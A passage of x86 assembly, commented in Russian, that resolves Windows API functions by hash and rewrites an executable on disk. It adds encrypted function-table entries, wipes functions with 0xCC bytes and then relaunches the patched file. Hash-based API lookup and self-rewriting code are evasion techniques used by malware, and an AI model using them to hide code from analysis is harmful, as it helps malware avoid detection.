	call eax					; WriteFile
	
	cmp eax, 0x00
	je end_prog
; --------------------------------------------------------------
; Записываем в таблицу запись о новой функции

	; Переставляем указатель
	; Получаем VA SetFilePointer
	mov esi, [addr_kernel32_table]
	mov ebx, 0x9A94D85	 
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00 					; SetFilePointer FILE_BEGIN
	push 0x00					; lpDistanceToMoveHigh
	push 0x01					; lDistanceToMove
	push [hCodeFile] 			; hFile
	call eax 					; SetFilePointer
	
	cmp eax, 0xFFFFFFFF			; INVALID_SET_FILE_POINTER
	je end_prog
	
	; Получаем VA ReadFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0xAFB3BF8D			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00 					; lpOverlapped
	lea ecx, [buffer + 0x10]
	push ecx 					; lpNumberOfBytesRead
	push 0x04					; nNumberOfBytesToRead
	push buffer					; lpBuffer
	push [hCodeFile]			; hFile
	call eax 					; ReadFile
	
	cmp eax, 0x00
	je end_prog
	
	; шифруем адрес функции
	mov ebx, dword [buffer]		; хэш названия
	mov eax, [textVS]			; смещение в .text
	
	add eax, ebx
	mov cl, bl
	ror eax, cl
	xor eax, ebx	

	mov dword [buffer + 0x04], eax		; сохраняем криптограмму
	
	; Переставляем указатель
	; Получаем VA SetFilePointer
	mov esi, [addr_kernel32_table]
	mov ebx, 0x9A94D85	 
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00 					; SetFilePointer FILE_BEGIN
	push 0x00					; lpDistanceToMoveHigh
	push [rawTableEntry]			; lDistanceToMove
	push [hMainFile] 			; hFile
	call eax 					; SetFilePointer
	
	cmp eax, 0xFFFFFFFF			; INVALID_SET_FILE_POINTER
	je end_prog
	
	; Получаем VA WriteFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0x0684B82A			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00  					; lpOverlapped
	lea ecx, [buffer + 0x10]
	push ecx 					; lpNumberOfBytesWritten
	push 0x08 					; nNumberOfBytesToWrite
	push buffer					; lpBuffer
	push [hMainFile] 			; hFile
	call eax					; WriteFile
	
	cmp eax, 0x00
	je end_prog
	
	jmp start_prog
	
; --------------------------------------------------------------
; Удаляем фукнцию (перезаписать байтом 0xCC)
del_func:
	; Получаем VA SetFilePointer
	mov esi, [addr_kernel32_table]
	mov ebx, 0x9A94D85			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00 					; SetFilePointer FILE_BEGIN
	push 0x00					; lpDistanceToMoveHigh
	push 0x01					; lDistanceToMove
	push [hCodeFile] 			; hFile
	call eax 					; SetFilePointer
	
	cmp eax, 0xFFFFFFFF			; INVALID_SET_FILE_POINTER
	je end_prog
	
	; Получаем VA ReadFile (считываем название функции)
	mov esi, [addr_kernel32_table]
	mov ebx, 0xAFB3BF8D			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00 					; lpOverlapped
	mov ecx, buffer
	add ecx, 0x10
	push ecx 					; lpNumberOfBytesRead
	push 0x04					; nNumberOfBytesToRead [что делать]
	push buffer					; lpBuffer
	push [hCodeFile]			; hFile
	call eax 					; ReadFile
	
	cmp eax, 0x00
	je end_prog
	
	mov ebx, dword [buffer]		; получаем хеш название функции
	
	; Получаем адрес таблицы
	mov esi, [hGlob]
	add esi, rawMy_func_table
	
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	mov dword [buffer + 0x04], eax	; сохраняем адрес
	
	
	mov ebx, dword [buffer]		; получаем хеш название функции
	; Получаем адрес таблицы
	mov esi, [hGlob]
	add esi, rawMy_func_table
	
find_next_func:
	lodsd
	
	cmp eax, ebx
	je get_next_func
	
	lodsd
	jmp find_next_func
	
get_next_func:
	sub esi, 0x04	; получаем адрес записи в табл ф, что надо удалить
	mov dword [buffer + 0x0C], esi		; сохраняем его
	add esi, 0x04
	
g_n_f_iter:
	add esi, 0x04
	lodsd 			; получаем хеш след функции
	
	cmp eax, 0x00
	je mov_text_vs						; если конец таблицы
	
	cmp eax, 0xCCCCCCCC
	je g_n_f_iter				; если удаленный ф 0xCCCCCCCC
	
	mov ebx, eax 
	mov esi, [hGlob]
	add esi, rawMy_func_table
	
	call get_func_addr
	mov dword [buffer + 0x08], eax	; сохр адрес после ф
	
	jmp calc_func_size
	
mov_text_vs:
	mov eax, [textVS]
	mov dword [buffer + 0x08], eax 	; сохр адрес после ф

calc_func_size:
	mov eax, dword [buffer + 0x08]
	sub eax, dword [buffer + 0x04]	
	
	mov dword [buffer + 0x08], eax	; сохр размер ф
	
	; удаляем хеш в таблице
	mov esi, dword [buffer + 0x0C]
	mov dword [esi], 0xCCCCCCCC
	add esi, 0x04
	mov dword [esi], 0xCCCCCCCC
	
	; удаляем тело функции
	mov ecx, dword [buffer + 0x08]
	mov esi, dword [buffer + 0x04]
	add esi, dword [textPointerToRawData]	; смещение функции
	add esi, dword [hGlob]					; VA
	
fill_0xCC:
	mov byte [esi], 0xCC
	inc esi 
	loop fill_0xCC
	
; Сохраняем изменения в файл	
	; Получаем VA SetFilePointer
	mov esi, [addr_kernel32_table]
	mov ebx, 0x9A94D85			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00 					; SetFilePointer FILE_BEGIN
	push 0x00					; lpDistanceToMoveHigh
	push 0x00					; lDistanceToMove
	push [hMainFile] 			; hFile
	call eax 					; SetFilePointer
	
	cmp eax, 0xFFFFFFFF			; INVALID_SET_FILE_POINTER
	je end_prog

	; Получаем VA WriteFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0x0684B82A			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00  					; lpOverlapped
	push buffer 				; lpNumberOfBytesWritten
	push [szMainFile] 			; nNumberOfBytesToWrite
	push [hGlob]				; lpBuffer
	push [hMainFile] 			; hFile
	call eax					; WriteFile
	
	cmp eax, 0x00
	je end_prog
	

start_prog:	
	; VA CloseHandle
	mov esi, [addr_kernel32_table]
	mov ebx, 0x28546828			
	call get_func_addr
	
	push [hMainFile]
	call eax
	
	; обработка ком. строки
	mov esi, dword [filename]	; строка
	xor ecx, ecx				; счетчик символов
	
find_file_name1:
	inc ecx
	lodsb
	
	cmp al, 0x22				; '"'
	je next_word1
	
	cmp al, 0x3A				; ':'
	je save_file_name1
	jmp find_file_name1
	
next_word1:
	xor ecx, ecx
	jmp find_file_name1
	
save_file_name1:
	sub esi, ecx				; переходим в начало названия файла
	mov edi, buffer
	dec ecx
	push ecx					; сохр. длины названия файла
	
	; Записываем название основного файла в буфер
save_file_name_iter1:
	movsb
	loop save_file_name_iter1
	mov byte [edi], 0x00		; конец строки
	
; Запускаем процесс
	; Получаем VA CreateProcessA
	mov esi, [addr_kernel32_table]
	mov ebx, 0x5EFB9356
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push prinfo				; lpProcessInformation
	push stinfo				; lpStartupInfo
	push 0x00				; lpCurrentDirectory
	push 0x00 				; lpEnvironment
	push 0x00 				; dwCreationFlags
	push 0x00 				; bInheritHandles
	push 0x00 				; lpThreadAttributes
	push 0x00 				; lpProcessAttributes
	push 0x00 				; lpCommandLine
	push buffer				; lpApplicationName
	
	call eax				; CreateProcessA


; --------------------------------------------------------------
; Завершаем работу программы
end_prog:
	; VA GlobalFree
	mov esi, [addr_kernel32_table]
	mov ebx, 0x038E24BB			
	call get_func_addr
	
	push [hGlob]
	call eax 
	
	; VA CloseHandle
	mov esi, [addr_kernel32_table]
	mov ebx, 0x28546828			
	call get_func_addr
	
	push [hMainFile]
	call eax

	; VA CloseHandle
	mov esi, [addr_kernel32_table]
	mov ebx, 0x28546828	
	call get_func_addr
	
	push [hCodeFile]
	call eax

	; Получаем VA ExitProcess
	mov esi, [addr_kernel32_table]
	mov ebx, 0xC6974388	
	call get_func_addr
	
	push 0
	call eax